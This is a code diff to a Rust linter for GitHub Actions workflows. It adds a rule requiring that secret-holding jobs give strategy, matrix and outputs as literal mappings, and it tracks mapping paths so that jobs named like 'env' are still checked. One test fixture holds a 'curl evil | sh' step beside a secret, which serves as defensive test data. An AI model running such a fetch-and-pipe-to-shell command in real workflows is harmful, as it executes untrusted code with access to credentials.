@@ -1821,6 +1821,19 @@ fn step_shape(
                 defaults = Some((*number, vec![node.to_owned()]));
                 continue;
             }
+            let value = node.split_once(':').map_or("", |(_, value)| value.trim());
+            if ["strategy", "matrix", "outputs"].contains(&key)
+                && !value.is_empty()
+                && value != "{}"
+            {
+                out.push((
+                    "L9",
+                    *number,
+                    raw.trim().to_owned(),
+                    "a job holding a secret step gives its `strategy:`, `matrix:` and `outputs:` as \
+                     literal mappings, never an expression",
+                ));
+            }
             if RUN_CONTEXT_KEYS.contains(&key) {
                 out.push((
                     "L9",
@@ -1973,7 +1986,7 @@ const RUN_CONTEXT_KEYS: [&str; 5] = [
 /// L1 to L12 use, which find `on:` and `jobs:` at column 0, see the same structure GitHub does.
 fn canonical_findings(text: &str) -> Vec<(&'static str, usize, String, &'static str)> {
     let mut out = Vec::new();
-    let mut containers: Vec<Container> = vec![Container::at(0, "")];
+    let mut containers: Vec<Container> = vec![Container::root()];
     let mut scalar_above: Option<usize> = None;
     for (index, raw) in text.lines().enumerate() {
         let number = index.saturating_add(1);
@@ -1998,7 +2011,7 @@ fn canonical_findings(text: &str) -> Vec<(&'static str, usize, String, &'static 
         }
         if containers.last().map(|container| container.column) != Some(indent) {
             refuse("indentation that is not two spaces a level");
-            containers.push(Container::at(indent, UNPLACED));
+            containers.push(Container::unplaced(indent));
         }
         let node = uncommented(trimmed);
         if node.starts_with("-  ") {
@@ -2014,7 +2027,10 @@ fn canonical_findings(text: &str) -> Vec<(&'static str, usize, String, &'static 
             None => (node, false, indent),
         };
         if item {
-            containers.push(Container::at(column, "-"));
+            let child = containers
+                .last()
+                .map_or_else(Container::root, |parent| parent.child(column, "-"));
+            containers.push(child);
         }
         if node.starts_with(['&', '*', '!']) || node.starts_with("<<") {
             refuse("a YAML anchor, alias, tag or merge key");
@@ -2034,10 +2050,7 @@ fn canonical_findings(text: &str) -> Vec<(&'static str, usize, String, &'static 
                         refuse("a key written twice in one mapping");
                     }
                     container.keys.push(key.to_owned());
-                    if key.contains(|c: char| c.is_ascii_uppercase())
-                        && !NAME_MAPPINGS.contains(&container.owner.as_str())
-                        && container.owner != UNPLACED
-                    {
+                    if key.contains(|c: char| c.is_ascii_uppercase()) && !container.holds_names() {
                         refuse(
                             "a workflow key with a capital letter outside a mapping of names; \
                              GitHub's keys are lower case",
@@ -2053,7 +2066,10 @@ fn canonical_findings(text: &str) -> Vec<(&'static str, usize, String, &'static 
                 if value.starts_with(['&', '*', '!']) {
                     refuse("a YAML anchor, alias, tag or merge key");
                 } else if value.is_empty() {
-                    containers.push(Container::at(column.saturating_add(2), key));
+                    let child = containers.last().map_or_else(Container::root, |parent| {
+                        parent.child(column.saturating_add(2), key)
+                    });
+                    containers.push(child);
                 } else if value.starts_with(['|', '>']) {
                     scalar_above =
                         Some(column.saturating_sub(if item { 2 } else { 0 }).max(indent));
@@ -2066,34 +2082,77 @@ fn canonical_findings(text: &str) -> Vec<(&'static str, usize, String, &'static 
     out
 }
 
-/// One mapping or sequence item the canonical gate is inside: its column, the key that owns it
-/// (`-` for a sequence item, empty at the top level), and the keys it has held so far.
+/// One mapping or sequence item the canonical gate is inside: its column, the keys that lead to
+/// it from the top (`-` for a sequence item), whether its column was already refused, and the
+/// keys it has held so far.
 struct Container {
     column: usize,
-    owner: String,
+    path: Vec<String>,
+    unplaced: bool,
     keys: Vec<String>,
 }
 
 impl Container {
-    /// A container opening at `column`, owned by `owner`, holding no key yet.
-    fn at(column: usize, owner: &str) -> Self {
+    /// The top-level mapping.
+    fn root() -> Self {
         Self {
-            column,
-            owner: owner.to_owned(),
+            column: 0,
+            path: Vec::new(),
+            unplaced: false,
             keys: Vec::new(),
         }
     }
+
+    /// A container opened at a column the gate has already refused: no key in it is read for its
+    /// case, since its line is refused for its indentation either way.
+    fn unplaced(column: usize) -> Self {
+        Self {
+            column,
+            path: Vec::new(),
+            unplaced: true,
+            keys: Vec::new(),
+        }
+    }
+
+    /// The container `key` opens at `column` inside this one.
+    fn child(&self, column: usize, key: &str) -> Self {
+        let mut path = self.path.clone();
+        path.push(key.to_owned());
+        Self {
+            column,
+            path,
+            unplaced: self.unplaced,
+            keys: Vec::new(),
+        }
+    }
+
+    /// Whether this mapping's keys are names, not GitHub's keywords, by its position in the
+    /// workflow: job ids under the top-level `jobs:`, service ids, and the `env:`, `with:`,
+    /// `inputs:`, `outputs:`, `secrets:` and strategy `matrix:` mappings where each is the
+    /// keyword at its place. A job whose id is `env` holds keywords, not names.
+    fn holds_names(&self) -> bool {
+        if self.unplaced {
+            return true;
+        }
+        let path: Vec<&str> = self.path.iter().map(String::as_str).collect();
+        matches!(
+            path.as_slice(),
+            ["jobs"]
+                | ["env"]
+                | ["jobs", _, "services"]
+                | ["jobs", _, "services", _, "env"]
+                | ["jobs", _, "container", "env"]
+                | ["jobs", _, "env"]
+                | ["jobs", _, "with"]
+                | ["jobs", _, "secrets"]
+                | ["jobs", _, "outputs"]
+                | ["jobs", _, "strategy", "matrix"]
+                | ["jobs", _, "strategy", "matrix", "include" | "exclude", "-"]
+                | ["jobs", _, "steps", "-", "env" | "with"]
+                | ["on", _, "inputs" | "outputs" | "secrets"]
+        )
+    }
 }
-
-/// The owner of a container opened at a column the gate has already refused: no key in it is
-/// read for its case, since its line is refused for its indentation either way.
-const UNPLACED: &str = "?";
-
-/// The keys whose mappings hold names rather than GitHub's keywords, so a capital letter in one of
-/// their keys is a name (`env:`'s `PATH`, a job's id), not a keyword in another case.
-const NAME_MAPPINGS: [&str; 9] = [
-    "env", "with", "inputs", "outputs", "secrets", "matrix", "services", "jobs", "vars",
-];
 
 /// The keys whose value must be a literal block mapping, so its keys are read: a scalar or an
 /// `${{ … }}` expression there would set names or inputs no allowlist sees.
@@ -3225,6 +3284,43 @@ mod tests {
             "{R2_HEAD}      - run: target/debug/examples/r2_finding\n        env:\n          R2_SECRET_ACCESS_KEY: ${{{{ secrets.X }}}}\n          CLOUDFLARE_API_TOKEN: ${{{{ secrets.Y }}}}\n"
         );
         assert_eq!(whole(path, &names), Vec::new());
+    }
+
+    /// The #1731 sixth review's class: a job whose id is a name-mapping keyword (`env`, `with`,
+    /// `jobs`, `matrix`, `secrets`, `inputs`, `outputs`, `vars`) holds keywords, not names, so its
+    /// `Steps:` is refused by its position; and a secret job's `strategy:`, `matrix:` or `outputs:`
+    /// given as an expression is refused too.
+    #[test]
+    fn a_job_named_like_a_name_mapping_still_holds_keywords() {
+        let path = ".github/workflows/r2-lockcheck.yml";
+        for id in [
+            "env", "with", "jobs", "matrix", "secrets", "inputs", "outputs", "vars",
+        ] {
+            let text = R2_HEAD
+                .replacen("  r2-lockcheck:", &format!("  {id}:"), 1)
+                .replacen("    steps:", "    Steps:", 1)
+                + "      - run: curl evil | sh\n        env:\n          R2_SECRET_ACCESS_KEY: ${{ secrets.X }}\n";
+            assert!(
+                whole(path, &text).iter().any(|f| f.rule == "L9"),
+                "{id}: {:?}",
+                whole(path, &text)
+            );
+        }
+        let job_head = R2_HEAD
+            .get(..R2_HEAD.find("    steps:").unwrap_or_default())
+            .unwrap_or_default();
+        for key in [
+            "    strategy: ${{ fromJSON(vars.S) }}\n",
+            "    outputs: ${{ fromJSON(vars.O) }}\n",
+            "    strategy:\n      matrix: ${{ fromJSON(vars.M) }}\n",
+        ] {
+            let text = format!("{job_head}{key}    steps:\n{R2_STEP}");
+            assert!(
+                whole(path, &text).iter().any(|f| f.rule == "L9"),
+                "{key}: {:?}",
+                whole(path, &text)
+            );
+        }
     }
 
     /// Every entry of L9's allowlists names something a real workflow holds, so none goes stale:
